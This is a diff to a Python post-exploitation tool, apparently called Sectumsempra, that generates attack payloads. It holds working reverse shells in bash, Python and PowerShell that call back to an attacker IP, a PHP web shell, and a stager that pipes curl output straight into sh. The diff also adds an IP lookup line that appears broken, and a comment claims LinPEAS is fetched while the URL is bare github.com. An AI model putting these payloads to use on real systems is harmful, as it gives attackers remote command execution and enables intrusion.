@@ -8,17 +8,16 @@ from datetime import datetime
 OLLAMA_URL = "http://localhost:11434/api/generate"
 
 BANNER = r"""
-===================================================================
-  ____           _                                                
- / ___|  ___  ___| |_ _   _ _ __ ___  ___  ___ _ __  _ __   __ _  
- \___ \ / _ \/ __| __| | | | '_ ` _ \/ __|/ _ \ '_ \| '_ \ / _` | 
-  ___) |  __/ (__| |_| |_| | | | | | \__ \  __/ |_) | |_) | (_| | 
-
- |____/ \___|\___|\__|\__,_|_| |_| |_|___/\___| .__/| .__/ \__,_| v1.0
-                                              |_|   |_|           
-===================================================================
- [*] Automated Payload & Post-Exploitation Engine
-===================================================================
+=========================================================================================================
+ ╔██████╗███████╗ ██████╗████████╗██╗   ██╗███╗   ███╗███████╗███████╗███╗   ███╗██████╗ ██████╗  █████╗ 
+ ██╔════╝██╔════╝██╔════╝╚══██╔══╝██║   ██║████╗ ████║██╔════╝██╔════╝████╗ ████║██╔══██╗██╔══██╗██╔══██╗
+ ███████╗█████╗  ██║        ██║   ██║   ██║██╔████╔██║███████╗█████╗  ██╔████╔██║██████╔╝██████╔╝███████║
+ ╚════██║██╔══╝  ██║        ██║   ██║   ██║██║╚██╔╝██║╚════██║██╔══╝  ██║╚██╔╝██║██╔═══╝ ██╔══██╗██╔══██║
+ ███████║███████╗╚██████╗   ██║   ╚██████╔╝██║ ╚═╝ ██║███████║███████╗██║ ╚═╝ ██║██║     ██║  ██║██║  ██║
+ ╚══════╝╚══════╝ ╚═════╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝╚══════╝╚══════╝╚═╝     ╚═╝╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝
+=========================================================================================================
+ [*] Automated Payload & Post-Exploitation Framework
+=========================================================================================================
 """
 
 def print_banner():
@@ -29,7 +28,7 @@ def get_attack_ip():
     try:
         import netifaces
         if 'tun0' in netifaces.interfaces():
-            return netifaces.ifaddresses('tun0')[socket.AF_INET][0]['addr']
+            return netifaces.ifaddresses('tun0')[socket.AF_INET]['addr']
     except Exception:
         pass
     
@@ -47,8 +46,8 @@ def generate_payloads(target_ip, attack_ip, lport):
     payloads = {
         "linux_bash": f"bash -i >& /dev/tcp/{attack_ip}/{lport} 0>&1",
         "linux_python": f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{attack_ip}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn(\"bash\")'",
-        "windows_powershell": f"\$c = New-Object System.Net.Sockets.TCPClient('{attack_ip}',{lport});s = c.GetStream();[byte[]]\(b = 0..65535\vert{}\%{{0}};while((\)i = s.Read(b, 0, b.Length)) -ne 0);d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(b,0, i);sb = (iex d 2>&1 | Out-String );sb2 = sb + 'PS ' + (pwd).Path + '> ' + \(attack_ip + '\) ';\(sendbyte = ([text.encoding]::ASCII).GetBytes(\)sb2);s.Write(sendbyte,0,sendbyte.Length);s.Flush()}}",
-        "php_web": "<?php system(\$_GET['cmd']); ?>"
+        "windows_powershell": f"$c = New-Object System.Net.Sockets.TCPClient('{attack_ip}',{lport});$s = $c.GetStream();[byte[]]$b = 0..65535|%{{0}};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){{;$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $d 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ' + $attack_ip + '$ ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sendbyte,0,$sendbyte.Length);$s.Flush()}}",
+        "php_web": "<?php system($_GET['cmd']); ?>"
     }
     return payloads
 
@@ -68,7 +67,7 @@ def write_linux_payload(target_ip, payloads, lport):
             # Startar din reverse shell i bakgrunden så att stagen kan rulla vidare
             f.write(f"{payloads['linux_bash']} &\n\n")
             
-            # Dynamiskt inbakad stager som laddar ner och kör LinPEAS i minnet utan disk-skrivning
+            # Dynamiskt inbakad stager som laddar ner och kör LinPEAS i minnet
             f.write("echo '[*] Execution window active. Injecting live privilege audit directly into memory...'\n")
             f.write("curl -sL https://github.com | sh\n")
         return filename
